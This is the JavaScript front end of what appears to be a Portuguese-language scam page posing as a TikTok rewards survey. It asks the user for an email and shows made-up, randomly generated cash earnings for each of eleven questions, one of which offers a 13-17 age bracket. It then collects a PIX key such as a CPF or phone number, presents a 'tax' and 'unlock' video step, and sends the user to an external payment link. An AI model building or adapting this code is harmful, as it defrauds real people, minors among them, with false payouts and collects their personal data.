// Estado do quiz
let currentQuestionIndex = 0;
let totalEarnings = 0;
let userEmail = '';

// Perguntas do quiz baseadas nas imagens
const questions = [
    {
        id: 1,
        icon: '😊',
        title: 'Como você avalia sua experiência geral no TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '😍', text: 'Excelente', value: 'excellent' },
            { icon: '😊', text: 'Boa', value: 'good' },
            { icon: '😐', text: 'Regular', value: 'regular' },
            { icon: '😞', text: 'Ruim', value: 'bad' }
        ]
    },
    {
        id: 2,
        icon: '🎬',
        title: 'Qual é o seu formato de vídeo favorito no TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '🎞️', text: 'Vídeo curto', value: 'short' },
            { icon: '🎥', text: 'Vídeo médio', value: 'medium' },
            { icon: '🏆', text: 'Vídeo longo', value: 'long' },
            { icon: '📺', text: 'Live', value: 'live' }
        ]
    },
    {
        id: 3,
        icon: '🔍',
        title: 'Como você descobre novos vídeos no TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '🎯', text: 'Feed "Para você"', value: 'foryou' },
            { icon: '👥', text: 'Seguindo criadores', value: 'following' },
            { icon: '🔍', text: 'Através de hashtags', value: 'hashtags' },
            { icon: '📊', text: 'Feed "Seguindo"', value: 'following_feed' },
            { icon: '💡', text: 'Recomendações', value: 'recommendations' }
        ]
    },
    {
        id: 4,
        icon: '⏰',
        title: 'Quantas horas por dia você passa no TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '⏱️', text: 'Menos de 1 hora', value: 'less_1h' },
            { icon: '⏰', text: '1 a 2 horas', value: '1_2h' },
            { icon: '🕐', text: '2 a 4 horas', value: '2_4h' },
            { icon: '🕓', text: '4 a 6 horas', value: '4_6h' },
            { icon: '🕕', text: 'Mais de 6 horas', value: 'more_6h' }
        ]
    },
    {
        id: 5,
        icon: '✨',
        title: 'O que te faz seguir um criador no TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '🎭', text: 'Conteúdo divertido', value: 'fun_content' },
            { icon: '📚', text: 'Conteúdo educativo', value: 'educational' },
            { icon: '💛', text: 'Conexão pessoal', value: 'personal' },
            { icon: '🔥', text: 'Participação em desafios', value: 'challenges' },
            { icon: '📅', text: 'Frequência de postagens', value: 'frequency' }
        ]
    },
    {
        id: 6,
        icon: '😂',
        title: 'Qual desses temas de conteúdo você mais gosta de assistir no TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '😂', text: 'Comédia', value: 'comedy' },
            { icon: '💃', text: 'Dança', value: 'dance' },
            { icon: '📖', text: 'Tutoriais e dicas', value: 'tutorials' },
            { icon: '📹', text: 'Vlogs diários', value: 'vlogs' },
            { icon: '💄', text: 'Moda e beleza', value: 'fashion' }
        ]
    },
    {
        id: 7,
        icon: '🌅',
        title: 'Qual horário do dia você mais usa o TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '🌅', text: 'Manhã', value: 'morning' },
            { icon: '🌞', text: 'Tarde', value: 'afternoon' },
            { icon: '🌙', text: 'Noite', value: 'night' },
            { icon: '🌃', text: 'Madrugada', value: 'dawn' }
        ]
    },
    {
        id: 8,
        icon: '📱',
        title: 'Qual seção do TikTok você mais acessa?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '🎯', text: 'Para Você', value: 'foryou' },
            { icon: '👥', text: 'Seguindo', value: 'following' },
            { icon: '📺', text: 'TikTok Live', value: 'live' },
            { icon: '🔍', text: 'Descobrir', value: 'discover' },
            { icon: '➕', text: 'Outro', value: 'other' }
        ]
    },
    {
        id: 9,
        icon: '💬',
        title: 'Com que frequência você comenta em vídeos do TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '💬', text: 'Sempre', value: 'always' },
            { icon: '🔄', text: 'Frequentemente', value: 'frequently' },
            { icon: '⏱️', text: 'Às vezes', value: 'sometimes' },
            { icon: '⚫', text: 'Raramente', value: 'rarely' },
            { icon: '🚫', text: 'Nunca', value: 'never' }
        ]
    },
    {
        id: 10,
        icon: '👆',
        title: 'Que tipo de interação você mais faz nos vídeos do TikTok?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '👆', text: 'Curtir', value: 'like' },
            { icon: '💬', text: 'Comentar', value: 'comment' },
            { icon: '📤', text: 'Compartilhar', value: 'share' },
            { icon: '💾', text: 'Salvar', value: 'save' },
            { icon: '🚫', text: 'Nenhuma', value: 'none' }
        ]
    },
    {
        id: 11,
        icon: '👤',
        title: 'Qual é a sua faixa etária?',
        subtitle: 'Selecione uma opção para continuar:',
        options: [
            { icon: '😊', text: '13-17 anos', value: '13_17' },
            { icon: '🎉', text: '18-24 anos', value: '18_24' },
            { icon: '😎', text: '25-34 anos', value: '25_34' },
            { icon: '👨', text: '35 anos ou mais', value: '35_plus' }
        ]
    }
];

// Valores aleatórios para cada pergunta (totalizando entre 500-600 reais)
const questionValues = [
    { min: 35, max: 65 },   // Q1: 35-65
    { min: 30, max: 60 },   // Q2: 30-60
    { min: 40, max: 70 },   // Q3: 40-70
    { min: 45, max: 75 },   // Q4: 45-75
    { min: 35, max: 55 },   // Q5: 35-55
    { min: 50, max: 80 },   // Q6: 50-80
    { min: 25, max: 45 },   // Q7: 25-45
    { min: 55, max: 85 },   // Q8: 55-85
    { min: 30, max: 50 },   // Q9: 30-50
    { min: 40, max: 60 },   // Q10: 40-60
    { min: 45, max: 65 }    // Q11: 45-65
]; // Total possível: 430-730 (média ~580)

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    // Não há mais loading screen
    document.getElementById('initial-screen').classList.remove('hidden');
    
    // Esconder notificação quando começar a digitar no email
    const emailInput = document.getElementById('email-input');
    if (emailInput) {
        emailInput.addEventListener('input', function() {
            hideEmailNotification();
        });
    }
});

function startQuiz() {
    const email = document.getElementById('email-input').value;
    
    if (!email || !email.includes('@')) {
        showEmailNotification();
        showShakeAnimation(document.getElementById('email-input'));
        return;
    }
    
    hideEmailNotification();
    userEmail = email;
    document.getElementById('initial-screen').classList.add('hidden');
    document.getElementById('quiz-container').classList.remove('hidden');
    
    showQuestion(0);
}

function showQuestion(index) {
    if (index >= questions.length) {
        showFinalScreen();
        return;
    }
    
    currentQuestionIndex = index;
    const question = questions[index];
    
    // Atualizar progresso
    document.getElementById('current-question').textContent = index + 1;
    const progressPercent = ((index + 1) / questions.length) * 100;
    document.getElementById('progress-bar').style.width = progressPercent + '%';
    
    // Renderizar pergunta
    const questionHtml = `
        <div class="question-enter">
            <div class="text-center mb-8">
                <div class="text-6xl mb-4 icon-bounce">${question.icon}</div>
                <h2 class="text-xl font-bold text-gray-800 mb-4">${question.title}</h2>
                <p class="text-gray-600">${question.subtitle}</p>
            </div>
            
            <div class="space-y-4 mb-8">
                ${question.options.map((option, optIndex) => `
                    <div class="option-card relative bg-white border-2 border-gray-200 rounded-lg p-4 flex items-center transition-all duration-300 hover:shadow-lg" 
                         onclick="selectOption(${optIndex})">
                        <div class="text-2xl mr-4">${option.icon}</div>
                        <span class="flex-1 text-gray-800 font-medium">${option.text}</span>
                        <div class="w-6 h-6 border-2 border-gray-300 rounded-full flex items-center justify-center">
                            <div class="w-3 h-3 bg-tiktok-red rounded-full opacity-0 transition-opacity duration-200" id="radio-${optIndex}"></div>
                        </div>
                    </div>
                `).join('')}
            </div>
            
            <button id="confirm-btn" onclick="confirmAnswer()" 
                    class="w-full bg-gray-400 text-white font-bold py-4 rounded-lg cursor-not-allowed transition-all duration-300" 
                    disabled>
                Confirmar
            </button>
            
            <div class="text-center mt-4">
                <p class="text-sm text-gray-500">🎁 Concorra a um bônus adicional</p>
                <p class="text-xs text-gray-400 mt-2">
                    Ao participar das atividades de recompensa, você concorda com nossos 
                    <span class="text-tiktok-red underline">Termos e Condições</span>.
                </p>
            </div>
        </div>
    `;
    
    document.getElementById('question-content').innerHTML = questionHtml;
    
    // Reset selected option
    window.selectedOption = null;
}

function selectOption(optionIndex) {
    // Remove seleção anterior
    document.querySelectorAll('.option-card').forEach(card => {
        card.classList.remove('selected');
    });
    
    document.querySelectorAll('[id^="radio-"]').forEach(radio => {
        radio.style.opacity = '0';
    });
    
    // Adicionar seleção atual
    const selectedCard = document.querySelectorAll('.option-card')[optionIndex];
    selectedCard.classList.add('selected');
    document.getElementById(`radio-${optionIndex}`).style.opacity = '1';
    
    // Habilitar botão confirmar
    const confirmBtn = document.getElementById('confirm-btn');
    confirmBtn.disabled = false;
    confirmBtn.classList.remove('bg-gray-400', 'cursor-not-allowed');
    confirmBtn.classList.add('bg-tiktok-red', 'hover:bg-red-600', 'ripple');
    
    window.selectedOption = optionIndex;
}

function confirmAnswer() {
    if (window.selectedOption === null) return;
    
    // Calcular ganho para esta pergunta
    const questionValue = questionValues[currentQuestionIndex];
    const earnedAmount = Math.random() * (questionValue.max - questionValue.min) + questionValue.min;
    const roundedAmount = Math.round(earnedAmount * 100) / 100;
    
    totalEarnings += roundedAmount;
    
    // Atualizar total no header
    updateTotalDisplay();
    
    // Mostrar modal de ganho
    showWinModal(roundedAmount);
}

function updateTotalDisplay() {
    const formattedTotal = totalEarnings.toLocaleString('pt-BR', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
    });
    document.getElementById('current-total').textContent = formattedTotal;
}

function showWinModal(amount) {
    const formattedAmount = amount.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    
    document.getElementById('win-amount').textContent = formattedAmount;
    const modal = document.getElementById('win-modal');
    modal.classList.remove('hidden');
    modal.classList.add('modal-show');
}

function continueQuiz() {
    document.getElementById('win-modal').classList.add('hidden');
    document.getElementById('win-modal').classList.remove('modal-show');
    
    setTimeout(() => {
        showQuestion(currentQuestionIndex + 1);
    }, 300);
}

function showFinalScreen() {
    document.getElementById('quiz-container').classList.add('hidden');
    document.getElementById('final-screen').classList.remove('hidden');
    
    const finalTotal = totalEarnings.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    
    document.getElementById('final-total').textContent = finalTotal;
    
    // Efeito especial de conclusão
    createCelebrationEffect();
}

function showWithdraw() {
    // Mostrar tela PIX
    document.getElementById('final-screen').classList.add('hidden');
    document.getElementById('pix-screen').classList.remove('hidden');
    document.getElementById('pix-screen').classList.add('screen-transition');
    
    // Atualizar saldos na tela PIX
    const availableBalance = totalEarnings.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    document.getElementById('available-balance').textContent = availableBalance;
    document.getElementById('max-amount-btn').textContent = availableBalance;
    
    // Adicionar formatação PIX no campo PIX
    const pixInput = document.getElementById('pix-key-input');
    const pixTypeSelect = document.querySelector('select');
    
    pixInput.addEventListener('input', formatPixKey);
    pixInput.addEventListener('input', hidePixKeyNotification);
    pixInput.addEventListener('input', clearPixErrors);
    
    // Adicionar event listener para mudança de tipo de chave PIX
    pixTypeSelect.addEventListener('change', function() {
        const type = this.value;
        updatePixPlaceholder(type);
        pixInput.value = ''; // Limpar campo ao mudar tipo
        hidePixKeyNotification(); // Esconder notificação
    });
    
    // Definir placeholder inicial
    updatePixPlaceholder(pixTypeSelect.value);
    
    // Limpar seleção anterior e resetar variáveis
    selectedWithdrawAmount = 0;
    document.querySelectorAll('.amount-btn').forEach(btn => {
        btn.classList.remove('border-teal-500', 'bg-teal-50');
        btn.classList.add('border-gray-200');
        
        // Adicionar event listener para esconder notificação de valor
        btn.addEventListener('click', hidePixValueNotification);
    });
    
    // Limpar notificações ao abrir a tela
    hideAllPixNotifications();
}

// Função para atualizar o placeholder do input PIX
function updatePixPlaceholder(type) {
    const pixInput = document.getElementById('pix-key-input');
    const placeholders = {
        'cpf': 'Digite seu CPF',
        'email': 'Digite seu e-mail',
        'telefone': 'Digite seu telefone',
        'chave-aleatoria': 'Digite sua chave aleatória'
    };
    
    pixInput.placeholder = placeholders[type] || placeholders['cpf'];
}

// Variável para armazenar o valor selecionado
let selectedWithdrawAmount = 0;

function selectAmount(amount) {
    selectedWithdrawAmount = amount;
    
    // Esconder notificação de valor se estiver visível
    hidePixValueNotification();
    
    // Remover seleção anterior
    document.querySelectorAll('.amount-btn').forEach(btn => {
        btn.classList.remove('border-teal-500', 'bg-teal-50', 'selected');
        btn.classList.add('border-gray-200');
    });
    
    // Adicionar seleção ao botão clicado com animação
    const clickedBtn = event.target;
    clickedBtn.classList.remove('border-gray-200');
    clickedBtn.classList.add('border-teal-500', 'bg-teal-50', 'selected');
    
    // Efeito visual de seleção
    clickedBtn.style.transform = 'scale(1.05)';
    setTimeout(() => {
        clickedBtn.style.transform = 'scale(1)';
    }, 150);
    
    // Vibração se suportado
    if (navigator.vibrate) {
        navigator.vibrate(50);
    }
}

function selectAmountMax() {
    selectedWithdrawAmount = totalEarnings;
    
    // Esconder notificação de valor se estiver visível
    hidePixValueNotification();
    
    // Remover seleção anterior
    document.querySelectorAll('.amount-btn').forEach(btn => {
        btn.classList.remove('border-teal-500', 'bg-teal-50', 'selected');
        btn.classList.add('border-gray-200');
    });
    
    // Adicionar seleção ao botão máximo com animação
    const maxBtn = document.getElementById('max-amount-btn');
    maxBtn.classList.remove('border-gray-200');
    maxBtn.classList.add('border-teal-500', 'bg-teal-50', 'selected');
    
    // Efeito visual de seleção
    maxBtn.style.transform = 'scale(1.05)';
    setTimeout(() => {
        maxBtn.style.transform = 'scale(1)';
    }, 150);
    
    // Vibração se suportado
    if (navigator.vibrate) {
        navigator.vibrate(50);
    }
}

function showTaxScreen() {
    // Validar se um valor foi selecionado
    if (selectedWithdrawAmount === 0) {
        showPixValueNotification();
        return;
    }
    
    // Validar chave PIX baseada no tipo selecionado
    const pixKey = document.getElementById('pix-key-input').value;
    const pixType = document.querySelector('select').value;
    
    if (!validatePixKey(pixKey, pixType)) {
        showPixKeyNotification(pixType);
        showShakeAnimation(document.getElementById('pix-key-input'));
        return;
    }
    
    // Se chegou até aqui, todas as validações passaram
    hideAllPixNotifications();
    
    // Mostrar tela de taxa
    document.getElementById('pix-screen').classList.add('hidden');
    document.getElementById('tax-screen').classList.remove('hidden');
    document.getElementById('tax-screen').classList.add('screen-transition');
    
    // Atualizar total na tela de taxa
    const taxTotal = totalEarnings.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    document.getElementById('tax-total').textContent = taxTotal;
}

// Função principal de validação PIX
function validatePixKey(key, type) {
    if (!key || key.trim() === '') return false;
    
    switch(type) {
        case 'cpf':
            return validateCPF(key);
        case 'email':
            return validateEmail(key);
        case 'telefone':
            return validatePhone(key);
        case 'chave-aleatoria':
            return validateRandomKey(key);
        default:
            return false;
    }
}

// Validação de e-mail
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email.trim());
}

// Validação de telefone brasileiro
function validatePhone(phone) {
    const cleanPhone = phone.replace(/\D/g, '');
    // Aceita formatos: (11) 99999-9999, 11999999999, +5511999999999
    return cleanPhone.length >= 10 && cleanPhone.length <= 13;
}

// Validação de chave aleatória
function validateRandomKey(key) {
    const trimmedKey = key.trim();
    // Chave aleatória deve ter pelo menos 8 caracteres alfanuméricos
    return trimmedKey.length >= 8 && /^[a-zA-Z0-9\-]+$/.test(trimmedKey);
}

// Atualizar função de formatação baseada no tipo
function formatPixKey(e) {
    const pixType = document.querySelector('select').value;
    
    switch(pixType) {
        case 'cpf':
            formatCPF(e);
            break;
        case 'telefone':
            formatPhone(e);
            break;
        // E-mail e chave aleatória não precisam de formatação especial
    }
}

// Formatação de telefone
function formatPhone(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{4,5})(\d{4})$/, '$1-$2');
    }
    e.target.value = value;
}

function showUnlockScreen() {
    // Mostrar tela de desbloqueio
    document.getElementById('tax-screen').classList.add('hidden');
    document.getElementById('unlock-screen').classList.remove('hidden');
    document.getElementById('unlock-screen').classList.add('screen-transition');
    
    // Atualizar total na tela de desbloqueio
    const unlockTotal = totalEarnings.toLocaleString('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    });
    document.getElementById('unlock-total').textContent = unlockTotal;
    
    // Configurar vídeo
    setupUnlockVideo();
}

function setupUnlockVideo() {
    const video = document.getElementById('unlock-video');
    const unlockButton = document.querySelector('button[onclick="finalRedirect()"]');
    
    if (video) {
        // Tentar auto-play (pode não funcionar em alguns navegadores por política)
        video.muted = true; // Necessário para auto-play em muitos navegadores
        
        // Event listeners para o vídeo
        video.addEventListener('loadeddata', function() {
            console.log('Vídeo carregado com sucesso');
            // Opcional: tentar reproduzir automaticamente
            // video.play().catch(e => console.log('Auto-play bloqueado pelo navegador'));
        });
        
        video.addEventListener('play', function() {
            console.log('Vídeo iniciado');
            // Remover mute quando o usuário interagir
            setTimeout(() => {
                video.muted = false;
            }, 1000);
        });
        
        video.addEventListener('pause', function() {
            console.log('Vídeo pausado');
        });
        
        video.addEventListener('ended', function() {
            console.log('Vídeo finalizado');
            // Destacar o botão quando o vídeo terminar
            unlockButton.classList.add('animate-pulse');
            unlockButton.innerHTML = '✨ DESBLOQUEAR AGORA - VÍDEO ASSISTIDO!';
            
            // Vibração de celebração se suportado
            if (navigator.vibrate) {
                navigator.vibrate([200, 100, 200]);
            }
        });
        
        video.addEventListener('timeupdate', function() {
            // Verificar se assistiu pelo menos 30% do vídeo
            if (video.duration > 0) {
                const progress = (video.currentTime / video.duration) * 100;
                if (progress > 30 && !unlockButton.classList.contains('video-watched')) {
                    unlockButton.classList.add('video-watched');
                    unlockButton.style.background = 'linear-gradient(45deg, #10B981, #34D399)';
                    unlockButton.innerHTML = '🎯 DESBLOQUEAR AGORA - CONTINUE ASSISTINDO';
                }
            }
        });
        
        video.addEventListener('error', function(e) {
            console.error('Erro ao carregar vídeo:', e);
            // Em caso de erro, mostrar mensagem alternativa para formato vertical
            const videoContainer = video.parentElement;
            videoContainer.innerHTML = `
                <div class="bg-gray-100 rounded-2xl flex items-center justify-center" style="aspect-ratio: 9/16; width: 280px;">
                    <div class="text-center p-4">
                        <div class="text-4xl mb-4">🎬</div>
                        <p class="text-gray-600 text-sm font-medium">Vídeo não disponível</p>
                        <p class="text-xs text-gray-500 mt-2">Continue para desbloquear<br>seu saldo</p>
                    </div>
                </div>
            `;
        });
        
        // Adicionar controles customizados se necessário
        video.setAttribute('playsinline', ''); // Para iOS
        video.setAttribute('webkit-playsinline', ''); // Para iOS mais antigo
        
        // Desabilitar menu de contexto (botão direito) para evitar download
        video.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
    }
}

function finalRedirect() {
    // Redirecionar para a página final
    window.location.href = 'https://go.nitropagamentos.com/hvv2plnskq';
}

// Funções de validação de CPF (mantidas para uso futuro)
function formatCPF(e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d)/, '$1.$2');
    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    e.target.value = value;
}

function validateCPF(cpf) {
    // Remove formatação
    cpf = cpf.replace(/[^\d]+/g, '');
    
    // Verifica se tem 11 dígitos
    if (cpf.length !== 11) return false;
    
    // Verifica se todos os dígitos são iguais
    if (/^(\d)\1{10}$/.test(cpf)) return false;
    
    // Validação do primeiro dígito verificador
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += parseInt(cpf.charAt(i)) * (10 - i);
    }
    let remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(9))) return false;
    
    // Validação do segundo dígito verificador
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += parseInt(cpf.charAt(i)) * (11 - i);
    }
    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    if (remainder !== parseInt(cpf.charAt(10))) return false;
    
    return true;
}

// Funções auxiliares
function showShakeAnimation(element) {
    element.style.animation = 'shake 0.5s ease-in-out';
    setTimeout(() => {
        element.style.animation = '';
    }, 500);
}

function createCelebrationEffect() {
    // Vibração (se suportado)
    if (navigator.vibrate) {
        navigator.vibrate([100, 50, 100, 50, 100]);
    }
}

function showEmailNotification() {
    const notification = document.getElementById('email-notification');
    const emailInput = document.getElementById('email-input');
    
    notification.classList.remove('hidden');
    notification.classList.add('animate-bounce-in');
    
    // Adicionar borda vermelha no input
    emailInput.classList.add('border-red-300', 'focus:ring-red-500');
    emailInput.classList.remove('border-gray-200', 'focus:ring-tiktok-red');
    
    // Auto esconder após 4 segundos
    setTimeout(() => {
        hideEmailNotification();
    }, 4000);
}

function hideEmailNotification() {
    const notification = document.getElementById('email-notification');
    const emailInput = document.getElementById('email-input');
    
    notification.classList.add('hidden');
    notification.classList.remove('animate-bounce-in');
    
    // Restaurar borda normal no input
    emailInput.classList.remove('border-red-300', 'focus:ring-red-500');
    emailInput.classList.add('border-gray-200', 'focus:ring-tiktok-red');
}

// Funções de validação PIX
function scrollToNotification(notificationId) {
    // Tentar fazer scroll para a notificação específica
    const notification = document.getElementById(notificationId);
    
    if (notification) {
        // Aguardar a notificação aparecer completamente
        setTimeout(() => {
            // Calcular posição da notificação menos um offset para ficar bem visível
            const notificationRect = notification.getBoundingClientRect();
            const currentScrollTop = window.pageYOffset;
            const targetScrollTop = currentScrollTop + notificationRect.top - 120; // 120px de margem superior
            
            // Fazer scroll suave
            window.scrollTo({
                top: Math.max(0, targetScrollTop),
                behavior: 'smooth'
            });
            
            // Adicionar destaque visual temporário
            notification.style.outline = '3px solid rgba(239, 68, 68, 0.3)';
            notification.style.outlineOffset = '4px';
            
            // Remover destaque após 2 segundos
            setTimeout(() => {
                notification.style.outline = '';
                notification.style.outlineOffset = '';
            }, 2000);
            
        }, 150); // Pequena pausa para garantir que a animação de entrada termine
    } else {
        // Fallback: ir para o topo se não encontrar a notificação
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    }
}

function showPixValueNotification() {
    const notification = document.getElementById('pix-value-notification');
    notification.classList.remove('hidden');
    notification.classList.add('animate-bounce-in');
    
    // Fazer scroll suave para mostrar a notificação
    scrollToNotification('pix-value-notification');
    
    // Vibração para chamar atenção se suportado
    if (navigator.vibrate) {
        navigator.vibrate([100, 50, 100]);
    }
    
    // Auto esconder após 4 segundos
    setTimeout(() => {
        hidePixValueNotification();
    }, 4000);
}

function hidePixValueNotification() {
    const notification = document.getElementById('pix-value-notification');
    notification.classList.add('hidden');
    notification.classList.remove('animate-bounce-in');
}

function showPixKeyNotification(type) {
    const notification = document.getElementById('pix-key-notification');
    const pixInput = document.getElementById('pix-key-input');
    const errorMessage = document.getElementById('pix-error-message');
    const errorExample = document.getElementById('pix-error-example');
    
    // Definir mensagens específicas para cada tipo
    const messages = {
        'cpf': {
            message: 'CPF inválido! Verifique os dados.',
            example: 'Exemplo: 123.456.789-00'
        },
        'email': {
            message: 'E-mail inválido! Verifique os dados.',
            example: 'Exemplo: seuemail@exemplo.com'
        },
        'telefone': {
            message: 'Telefone inválido! Verifique os dados.',
            example: 'Exemplo: (11) 99999-9999'
        },
        'chave-aleatoria': {
            message: 'Chave aleatória inválida! Verifique os dados.',
            example: 'Mínimo 8 caracteres alfanuméricos'
        }
    };
    
    const typeMessage = messages[type] || messages['cpf'];
    errorMessage.textContent = typeMessage.message;
    errorExample.textContent = typeMessage.example;
    
    notification.classList.remove('hidden');
    notification.classList.add('animate-bounce-in');
    
    // Fazer scroll suave para mostrar a notificação
    scrollToNotification('pix-key-notification');
    
    // Adicionar borda vermelha no input
    pixInput.classList.add('border-red-300', 'focus:ring-red-500', 'input-error');
    pixInput.classList.remove('border-gray-200', 'focus:ring-teal-500');
    
    // Vibração para chamar atenção se suportado
    if (navigator.vibrate) {
        navigator.vibrate([100, 50, 100]);
    }
    
    // Auto esconder após 4 segundos
    setTimeout(() => {
        hidePixKeyNotification();
    }, 4000);
}

function hidePixKeyNotification() {
    const notification = document.getElementById('pix-key-notification');
    const pixInput = document.getElementById('pix-key-input');
    
    notification.classList.add('hidden');
    notification.classList.remove('animate-bounce-in');
    
    // Restaurar borda normal no input
    pixInput.classList.remove('border-red-300', 'focus:ring-red-500', 'input-error');
    pixInput.classList.add('border-gray-200', 'focus:ring-teal-500');
}

function hideAllPixNotifications() {
    hidePixValueNotification();
    hidePixKeyNotification();
}

function clearPixErrors() {
    hideAllPixNotifications();
    
    // Remover classes de erro dos inputs
    const pixInput = document.getElementById('pix-key-input');
    pixInput.classList.remove('input-error', 'border-red-300', 'focus:ring-red-500');
    pixInput.classList.add('border-gray-200', 'focus:ring-teal-500');
}

// Adicionar event listeners
document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        const confirmBtn = document.getElementById('confirm-btn');
        if (confirmBtn && !confirmBtn.disabled) {
            confirmAnswer();
        }
    }
});



// Função para debug (pode ser removida em produção)
function resetQuiz() {
    currentQuestionIndex = 0;
    totalEarnings = 0;
    userEmail = '';
    updateTotalDisplay();
    
    document.getElementById('final-screen').classList.add('hidden');
    document.getElementById('quiz-container').classList.add('hidden');
    document.getElementById('initial-screen').classList.remove('hidden');
}

// Funções de debug para testar notificações (remover em produção)
function testPixValueNotification() {
    showPixValueNotification();
}

function testPixKeyNotification() {
    showPixKeyNotification('cpf');
} 